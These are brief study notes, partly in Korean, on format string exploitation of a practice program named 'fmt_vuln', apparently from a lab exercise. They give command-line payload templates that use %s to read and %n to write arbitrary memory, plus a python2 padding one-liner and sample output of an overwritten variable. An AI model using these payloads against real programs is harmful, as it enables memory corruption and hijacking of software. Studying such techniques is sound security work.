```
[+] Format string exploit code
[+] source name : fmt_vuln
[+] exploit code 
	./fmt_vuln $(printf '{getenv address}')%s
	%s : 해당 메모리의 값을 읽어옴
```

```
[+] Format string exploit code (%n)
[+] source name : fmt_vuln
[+] exploit code 
	./fmt_vuln $(printf '{getenv address}')%n
	%n : 해당 주소에 값을 씀
```

```
[+] Format string exploit code (%n)
[+] source name : fmt_vuln
[+] exploit code 
	./fmt_vuln `python2 -c "print '{variable address}'*{byte number} +'%d%c%n'"`

	%n is write the memory

	ubuntu 20.04 에서는
	%d 2byte
	%c 1byte

    [*] test_val @ 0x080e5068 = 170 0x000000aa
    ==> ./fmt_vuln $(printf "{function bytes}"")$(python2 -c "print 'a'*offset")%n
```